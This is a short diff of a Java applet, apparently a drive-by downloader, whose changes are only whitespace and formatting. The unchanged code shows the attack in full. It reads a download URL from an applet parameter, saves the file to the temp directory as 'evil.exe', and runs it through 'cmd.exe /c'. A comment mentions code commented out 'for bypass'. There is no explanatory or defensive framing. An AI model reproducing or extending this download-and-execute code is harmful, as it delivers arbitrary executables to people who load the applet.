@@ -22,7 +22,7 @@ public class Java extends Applet {
 	try {
 	String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
 	String expath = tmpdir + "evil.exe";
-	String  download = "";
+	String download = "";
 	download = getParameter("1");
 	if (download.length() > 0) {
 		// URL parameter
@@ -44,8 +44,9 @@ public class Java extends Applet {
 			   in.close();
 			   f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
 		 }
+
 	} catch(IOException e) {
-		e.printStackTrace();
+	    e.printStackTrace();
 	}
 	/* ended here and commented out below for bypass */
 	catch (Exception exception)
